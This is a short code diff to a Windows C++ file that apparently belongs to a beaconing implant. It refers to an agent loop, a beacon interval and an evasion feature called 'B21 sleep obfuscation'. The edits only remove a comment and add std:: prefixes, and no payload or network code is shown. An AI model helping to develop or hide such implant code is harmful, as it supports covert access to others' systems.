@@ -1,6 +1,3 @@
-// main_exe.cpp - Version modifiée avec B21 Sleep Obfuscation
-// Les modifications sont marquées avec // [B21]
-
 #include <windows.h>
 #include <iostream>
 #include <thread>
@@ -433,10 +430,10 @@ void agent_run() {
             #ifdef _DEBUG
             cerr << "[!] B21 sleep failed, using standard sleep" << endl;
             #endif
-            this_thread::sleep_for(chrono::seconds(BEACON_INTERVAL));
+            std::this_thread::sleep_for(chrono::seconds(BEACON_INTERVAL));
         }
         #else
-        this_thread::sleep_for(chrono::seconds(BEACON_INTERVAL));
+        std::this_thread::sleep_for(chrono::seconds(BEACON_INTERVAL));
         #endif
 
         #ifdef _DEBUG
